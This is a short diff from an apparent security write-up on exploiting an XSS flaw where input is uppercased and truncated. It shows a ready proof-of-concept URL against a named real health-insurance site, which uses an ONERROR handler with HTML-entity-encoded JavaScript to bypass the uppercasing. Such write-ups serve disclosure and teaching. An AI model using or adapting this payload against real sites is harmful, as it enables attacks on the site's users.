@@ -40,7 +40,7 @@ An important thing i forgot to mention is that the payload is **truncated to 255
 So this is **how to exploit an XSS when your payload is UPPERCASED (and truncated):**  
   
 **First payload:**  
-We can test the XSS thanks to this payload (alert - *also notice that we want to preserve the way how the webpage renders*):  
+We can test the XSS thanks to this payload (alert) - *also notice that we want to preserve the way how the webpage renders*:  
 ```
 https://assure.ameli.fr/PortailAS/appmanager/PortailAS/assure?connexioncompte_2numSecuriteSociale=" /><IMG SRC=X ONERROR=&#x61;&#x6C;&#x65;&#x72;&#x74;(&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x2E;&#x64;&#x6F;&#x6D;&#x61;&#x69;&#x6E;) hidden><nimp "&connexioncompte_2codeConfidentiel=&connexioncompte_2actionEvt=connecter
 ```
